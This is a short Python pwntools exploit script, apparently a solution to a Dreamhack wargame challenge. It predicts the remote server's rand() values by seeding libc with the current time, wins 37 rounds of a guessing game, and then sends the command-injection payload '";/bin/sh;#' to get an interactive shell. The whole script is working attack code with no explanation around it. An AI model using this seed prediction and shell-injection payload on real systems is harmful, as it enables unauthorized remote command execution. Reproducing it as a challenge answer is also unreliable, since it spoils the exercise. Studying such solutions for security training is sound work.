from pwn import *
import ctypes

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23422
r = remote(HOST, PORT)

libc = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0)+3)

for i in range(37):
    r.recvuntil(b'\'j\': ')
    rand = libc.rand() % 2
    if rand % 2 == 0:
        r.sendline(b'l')
    else:
        r.sendline(b'h')
    if b'invincible' in r.recvline():
        libc.rand()
        continue
    libc.rand()

r.sendlineafter(b': ', b'";/bin/sh;#')
r.interactive()